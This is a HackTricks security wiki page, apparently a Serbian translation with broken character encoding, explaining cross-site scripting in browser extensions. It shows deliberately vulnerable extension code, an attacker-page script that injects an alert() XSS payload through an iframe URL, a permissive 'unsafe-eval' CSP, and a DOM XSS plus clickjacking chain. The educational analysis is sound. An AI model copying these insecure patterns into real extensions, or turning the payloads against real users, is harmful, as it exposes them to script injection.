# BrowExt - XSS Primer

{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## Cross-Site Scripting (XSS) kroz Iframe

U ovoj postavci, **sadrÅ¾ajni skript** se implementira da instancira Iframe, ukljuÄujuÄ‡i URL sa parametrima upita kao izvor Iframe-a:
```javascript
chrome.storage.local.get("message", result => {
let constructedURL = chrome.runtime.getURL("message.html") +
"?content=" + encodeURIComponent(result.message) +
"&redirect=https://example.net/details";
frame.src = constructedURL;
});
```
Javna HTML stranica, **`message.html`**, je dizajnirana da dinamiÄki dodaje sadrÅ¾aj u telo dokumenta na osnovu parametara u URL-u:
```javascript
$(document).ready(() => {
let urlParams = new URLSearchParams(window.location.search);
let userContent = urlParams.get("content");
$(document.body).html(`${userContent} <button id='detailBtn'>Details</button>`);
$('#detailBtn').on('click', () => {
let destinationURL = urlParams.get("redirect");
chrome.tabs.create({ url: destinationURL });
});
});
```
Na zloÄ‡udnoj stranici se izvrÅ¡ava zloÄ‡udni skript, modifikujuÄ‡i `content` parametar izvora Iframe-a kako bi se uveo **XSS payload**. To se postiÅ¾e aÅ¾uriranjem izvora Iframe-a da ukljuÄuje Å¡tetni skript:
```javascript
setTimeout(() => {
let targetFrame = document.querySelector("iframe").src;
let baseURL = targetFrame.split('?')[0];
let xssPayload = "<img src='invalid' onerror='alert(\"XSS\")'>";
let maliciousURL = `${baseURL}?content=${encodeURIComponent(xssPayload)}`;

document.querySelector("iframe").src = maliciousURL;
}, 1000);
```
PreviÅ¡e permisivna politika bezbednosti sadrÅ¾aja kao Å¡to je:
```json
"content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self';"
```
omoguÄ‡ava izvrÅ¡avanje JavaScript-a, ÄineÄ‡i sistem ranjivim na XSS napade.

Alternativni pristup za izazivanje XSS-a ukljuÄuje kreiranje Iframe elementa i postavljanje njegovog izvora da ukljuÄuje Å¡tetni skript kao `content` parametar:
```javascript
let newFrame = document.createElement("iframe");
newFrame.src = "chrome-extension://abcdefghijklmnopabcdefghijklmnop/message.html?content=" +
encodeURIComponent("<img src='x' onerror='alert(\"XSS\")'>");
document.body.append(newFrame);
```
## DOM-based XSS + ClickJacking

Ovaj primer je preuzet iz [originalnog posta](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/).

Osnovni problem proistiÄe iz DOM-bazirane Cross-site Scripting (XSS) ranjivosti koja se nalazi u **`/html/bookmarks.html`**. ProblematiÄni JavaScript, deo **`bookmarks.js`**, je detaljno opisan u nastavku:
```javascript
$('#btAdd').on('click', function() {
var bookmarkName = $('#txtName').val();
if ($('.custom-button .label').filter(function() {
return $(this).text() === bookmarkName;
}).length) return false;

var bookmarkItem = $('<div class="custom-button">');
bookmarkItem.html('<span class="label">' + bookmarkName + '</span>');
bookmarkItem.append('<button class="remove-btn" title="delete">x</button>');
bookmarkItem.attr('data-title', bookmarkName);
bookmarkItem.data('timestamp', (new Date().getTime()));
$('section.bookmark-container .existing-items').append(bookmarkItem);
persistData();
});
```
Ovaj deo koda preuzima **vrednost** iz **`txtName`** ulaznog polja i koristi **spajanje stringova za generisanje HTML-a**, koji se zatim dodaje u DOM koristeÄ‡i jQuery-ovu `.append()` funkciju.

ObiÄno, Content Security Policy (CSP) Chrome ekstenzije bi spreÄila takve ranjivosti. MeÄ‘utim, zbog **opuÅ¡tanja CSP-a sa â€˜unsafe-evalâ€™** i koriÅ¡Ä‡enja jQuery-ovih metoda manipulacije DOM-om (koje koriste [`globalEval()`](https://api.jquery.com/jquery.globaleval/) za prosleÄ‘ivanje skripti u [`eval()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval) prilikom umetanja u DOM), eksploatacija je i dalje moguÄ‡a.

Iako je ova ranjivost znaÄajna, njena eksploatacija obiÄno zavisi od interakcije korisnika: posete stranici, unoÅ¡enja XSS payload-a i aktiviranja dugmeta â€œAddâ€.

Da bi se pojaÄala ova ranjivost, koristi se sekundarna **clickjacking** ranjivost. Manifest Chrome ekstenzije prikazuje opÅ¡irnu politiku `web_accessible_resources`:
```json
"web_accessible_resources": [
"html/bookmarks.html",
"dist/*",
"assets/*",
"font/*",
[...]
],
```
ZnaÄajno, stranica **`/html/bookmarks.html`** je podloÅ¾na uokviravanju, Å¡to je Äini ranjivom na **clickjacking**. Ova ranjivost se koristi za uokviravanje stranice unutar napadaÄeve stranice, prekrivajuÄ‡i je DOM elementima kako bi se obmanjujuÄ‡e redizajniralo korisniÄko suÄelje. Ova manipulacija dovodi Å¾rtve do nehotice interakcije sa osnovnom ekstenzijom.

## Reference

* [https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/](https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/)
* [https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
